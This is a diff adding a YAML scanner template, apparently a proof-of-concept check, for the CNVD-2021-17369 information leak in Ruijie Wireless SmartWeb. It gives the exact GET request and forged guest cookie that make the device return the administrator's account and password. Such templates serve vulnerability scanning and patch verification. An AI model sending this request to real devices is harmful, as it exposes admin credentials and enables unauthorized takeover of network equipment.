@@ -1,0 +1,21 @@
+name: Ruijie_wireless_SmartWeb_infoleak__CNVD_2021_17369
+transport: http
+set: {}
+detail:
+  dock: product="Ruijie-WiFi"
+  product: Ruijie Wireless SmartWeb
+  homepage: http://www.ruijie.com.cn/
+  impact: '<p><span style="color: rgb(3, 47, 98); font-size: 12px;">The attacker can
+    obtain the password of the administrator account from the vulnerability, and then
+    log in with the administrator authority</span><br></p>'
+  description: Ruijie wireless SmartWeb management System allow low-privilege user
+    reading a file that contains other accounts and passwords.
+rules:
+  r1:
+    method: GET
+    path: /web/xml/webuser-auth.xml
+    follow_redirects: false
+    headers:
+      Cookie: login=1; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
+    expression: response.status == 200 && response.body.bcontains(b'<userauth><user><name><![CDATA[   admin]]></name><password>')
+expression: r1()
